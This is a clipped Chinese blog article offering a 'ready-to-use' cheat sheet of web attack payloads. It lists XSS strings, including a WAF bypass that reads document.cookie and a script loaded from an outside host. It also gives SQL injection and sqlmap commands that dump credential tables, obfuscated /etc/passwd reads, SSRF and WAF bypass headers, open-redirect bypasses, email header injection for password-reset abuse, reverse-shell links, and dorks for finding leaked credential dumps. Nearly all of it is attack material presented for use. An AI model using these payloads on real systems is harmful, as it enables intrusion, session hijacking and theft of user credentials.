---
title: 【收藏】开箱即用的 Payloads
url: https://mp.weixin.qq.com/s?__biz=MjM5Mzc4MzUzMQ==&mid=2650257988&idx=1&sn=f932fbc5e57520eeb23144a64de5cd01&chksm=be92d1c089e558d6f6635cf5c2a54df36d903dd2cad980cdd3753f72ea0cb2378a990bfc7036&mpshare=1&scene=1&srcid=0220AUCgGdJ1OL18pNWUrzKE&sharer_shareinfo=028fa2855cd84c3e169c7c9a336b11b0&sharer_shareinfo_first=028fa2855cd84c3e169c7c9a336b11b0#rd
clipped_at: 2024-03-31 19:39:34
category: temp
tags: 
 - mp.weixin.qq.com
---


# 【收藏】开箱即用的 Payloads

#   

# **博客新域名：****https://gugesay.com  
  
**

# Payloads 字典：

https://github.com/swisskyrepo/PayloadsAllTheThings  
https://github.com/cujanovic/Markdown-XSS-Payloads  
https://github.com/pwntester/ysoserial.net  
https://github.com/swisskyrepo/PayloadsAllTheThings  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks (APIs)  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3   
(AWS Buckets)  
http://www.xss-payloads.com

# Payloads‘奥义’

## 利用 UTF-8 的 Bypass

```plain
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
Null = %00
```

## XSS‘创意’

```plain
#基本要点与首选
<script>alert(1)</script>
<script>alert(1)//
<script src="http://xss.rocks/xss.js"></script>
<img src/onerror=alert(1)>
<a href="javascript:alert(1)"></a>

#XSS 策略：
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

#Akamai WAF 绕过：
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>

#注入 XSS 或注入其他 html 标签形成新的登录页面：
https://saajanbhujel.medium.com/how-i-got-10-000-from-github-for-bypassing-filtration-of-html-tags-db31173c8b37

# XSS 执行 SSRF:
<script>window.location="http://endereço.."</script>

#其它：
<IMG SRC=javascript:alert('XSS')>

#jQuery 版本：
alert(jQuery.fn.jquery);
```

## Angular 模版注入

```plain
{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('alert(/XSS Stored!/)')()}}
1023+1 ou {{1023+1}}
```

## Ruby 模版注入

```plain
<%= 7*7 %>
```

## 读取 /etc/passwd

```plain
cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
??n/??t$IFS/?tc/????wd
??n${PATH%%[a-z]*}??t$IFS${PATH%%[a-z]*}??c${PATH%%u*}?????d
../../../../../../../../../../../../etc/passwd

Explantion:
$'\x41' => 'A' (HEX)
$'\U41' => 'A'  (HEX Unicode)
$'\101' => 'A' (Octal)
```

## SQL 注入‘创意’

```plain
1+OR/AND+1=1 and sELeCt/*Test*/1 and so .

/?id=1%27%20AND%20%271%27=LENGTH(%27;%27)%20--+
/?id=1%27%20AND%20%271%27=LENGTH(%27;;%27)%20--+

/?id=1%27%20AND%20%271%27=STRCMP(%22;%22,%20%22;%22);%20--+
/?id=1%27%20AND%20%271%27=STRCMP(%22;;%22,%20%22;%22);%20--+

/?id=1%27%20AND%20%271%27=(sELecT%20@LOL:=1)%20--+
/?id=1%27%20AND%20%271%27=(sELecT%20@LOL:=12)%20--+

#SQL 盲注 与 绕过：
Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z

#从 SQL 注入到 RCE：
https://systemweakness.com/sql-injection-to-remote-command-execution-rce-dd9a75292d1d
```

## RCE

https://www.revshells.com/  
  
https://www.100security.com.br/reverse-shell  
  
https://4bdoz.medium.com/rce-by-code-injection-perl-reverse-shell-a2e90181b10

## 常用 SQLMap 命令

```plain
https://github.com/sqlmapproject/sqlmap/wiki/Usage


sqlmap.py -u [URL]?[Param]=* dbms
sqlmap.py -u [URL]?[Param]=* dbms --cookie 'ASP.NET_SessionId=abc123'

sqlmap.py -u [URL]?[Param]=1 dbms --level=2,3,4,5

sqlmap.py -u [URL]?[Param]=1 --privileges

sqlmap.py -u [URL]?[Param]=1 --tables --fresh-queries
sqlmap.py -u [URL]?[Param]=1 --sql-shell

sqlmap.py -u [URL]?[Param]=1 -D [database_name] -T [table_name] --columns  --fresh-queries
sqlmap.py -u [URL]?[Param]=1 -D [database_name] -T [table_name] -C email,nome,senha --dump --fresh-queries

sqlmap.py -u [URL]?[Param]=1 -D [database_name] -T [table_name] --dump --predict-output

----

batch:
sqlmap.py -my \temp\sqlmap_targets.txt dbms
```

## 通过 IP 绕过 WAF 控制

```plain
X-Originating-IP:localhost
X-Forwarded-For:localhost
X-Remote-IP:localhost
X-Remote-Addr:localhost
X-Forwarded-Host:localhost
X-Client-IP:localhost
X-Remote-IP:localhost
X-Remote-Addr:localhost
X-Host:localhost
True-Client-Ip:localhost
```

## 忘记密码 - 利用电子邮件头注入

```plain
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```

## 开放重定向/SSRF Payloads 生成器

```plain
#基本 Payloads：
https://google.com/redirect.php?redirect=https:/facebook.com
https://google.com/redirect.php?redirect=https://facebook.com
https://google.com/redirect.php?redirect=http:/\/\facebook.com
https://google.com/redirect.php?redirect=https:/\facebook.com
https://google.com/redirect.php?redirect=#facebook.com
https://google.com/redirect.php?redirect=#%20@facebook.com
https://google.com/redirect.php?redirect=/facebook.com

#URL 编码：
https://google.com/redirect.php?redirect=%2Ffacebook.com
https://google.com/redirect.php?redirect=%2F%2Ffacebook.com
https://google.com/redirect.php?redirect=https%3A%2F%2Ffacebook.com

#CRLF：
https://google.com/redirect.php?redirect=%0D%0A/facebook.com

#白名单域或关键字：
https://google.com/redirect.php?redirect=google.com.facebook.com
https://google.com/redirect.php?redirect=google.comfacebook.com

#“https:”绕过“：
https://google.com/redirect.php?redirect=https:facebook.com

#"\/" 绕过：
https://google.com/redirect.php?redirect=\/\/facebook.com/
https://google.com/redirect.php?redirect=/\/facebook.com/

#参数污染：
https://google.com/redirect.php?redirect=?next=google.com&next=facebook.com

#@ 绕过：
https://google.com/redirect.php?redirect=@facebook.com

#// 绕过：
https://google.com/redirect.php?redirect=//facebook.com
https://google.com/redirect.php?redirect=
https://google.com/redirect.php?redirect=

#自右向左大法：
https://google.com/redirect.php?redirect=%40%E2%80%AE@moc.koobecaf

#空字节%00 绕过黑名单过滤器：
https://google.com/redirect.php?redirect=facebook%00.com

#'%E3%80%82' or '。'绕过：
https://google.com/redirect.php?redirect=facebook%E3%80%82com
https://google.com/redirect.php?redirect=facebook. com
```

## SSRF 绕过列表

PS：复制以下所有标头并粘贴到请求中

```plain
Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Port: 4443
X-Forwarded-Port: 80
X-Forwarded-Port: 8080
X-Forwarded-Port: 8443
X-Forwarded-Scheme: http
X-Forwarded-Scheme: https
X-Forwarded-Server: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
X-True-IP: 127.0.0.1
```

## 不安全的反序列化

```plain
#基本 Payloads:
https://github.com/pwntester/ysoserial.net

#Json 不安全反序列化：
https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a

#Json payloads:
https://github.com/pwntester/ysoserial.net
https://medium.com/c-sharp-progarmming/stop-insecure-deserialization-with-c-6a488c95cf2f
```

## 利用 JWT 标头注入绕过 WT 身份验证

https://www.youtube.com/watch?v=fdmnw3C8x34&ab\_channel=Hacklass

## PHP 备忘

https://hackcommander.github.io/pentesting-article-1/#

```plain
#探索 php 开关：

https://domdom.tistory.com/entry/HackTheBoo-Web-Juggling-Facts-Writeup%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4?category=1004766

  "body": "{\"type\":true}"

  fetch("http://198.211.107.250:1337/api/getfacts", {
    "headers": {
      "content-type": "application/json"
    },
    "body": "{\"type\":1}",
    "method": "POST",
    "mode": "cors",
  }).then((r)=>r.text()).
      then((r)=>console.log(r));
```

## Dorks 相关

```plain
https://www.exploit-db.com/google-hacking-database/
https://www.googleguide.com/advanced_operators_reference.html

#直接通过托管站点查找泄漏：

intitle:( combolist | dehashed | stealer ) site:anonfiles.com

#除了流行的 AnonFiles，也可以在以下平台上发现'有趣'的东西：

> bayfiles.com
> dataism-x.com
> pastebin.com
> justpaste.it
> file.io
> filechan.org
> mega.com
> drive.google.com

intext:"usuario" | "senha" | "username" | "password" | "mysql"
```